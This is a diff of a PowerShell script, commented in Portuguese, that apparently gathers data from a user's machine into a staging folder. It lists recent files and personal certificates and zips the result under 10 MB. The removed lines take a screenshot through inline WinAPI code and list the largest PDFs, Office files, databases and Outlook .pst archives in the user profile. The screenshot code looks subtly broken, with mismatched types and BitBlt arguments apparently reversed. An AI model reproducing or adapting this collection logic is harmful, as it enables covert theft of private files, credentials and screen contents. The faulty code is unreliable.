@@ -25,19 +25,6 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 # 3) Certificados
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
-# 4) Screenshot 800×600 via WinAPI (sem FromScreen)
-Add-Type -TypeDefinition @"
-using System; using System.Drawing; using System.Drawing.Imaging; using System.Runtime.InteropServices;
-public class Cap{ [DllImport("user32.dll")] static extern int GetDesktopWindow(); [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr hWnd);
-public static void Shot(string f){ IntPtr desk=GetDesktopWindow(), dc=GetWindowDC(desk); Bitmap bmp=new Bitmap(800,600); Graphics g=Graphics.FromImage(bmp); IntPtr gHdc=g.GetHdc(); BitBlt(dc,0,0,800,600,gHdc,0,0,0x00CC0020); g.ReleaseHdc(gHdc); bmp.Save(f,ImageFormat.Jpeg); g.Dispose(); bmp.Dispose(); ReleaseDC(desk,dc);
-} [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hDest,int x,int w,int h,IntPtr hSrc,int X,int Y,uint rop); [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd,IntPtr hDC); }
-"@
-[Cap]::Shot("$kit\ss.jpg")
-
-# 5) Top 100 arquivos
-$ext=@('*.pdf','*.doc*','*.xls*','*.txt','*.csv','*.db','*.sqlite','*.pst')
-Get-ChildItem $env:USERPROFILE -Include $ext -Recurse -Depth 2 -EA 0|Select FullName,Length,LastWriteTime|Sort Length -Descending|Select -First 100|Export-Csv "$kit\t.csv" -NoTypeInformation
-
 # 6) ZIP ≤ 10 MB
 Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal
 if((Get-Item "$kit.zip").Length -gt 10MB){
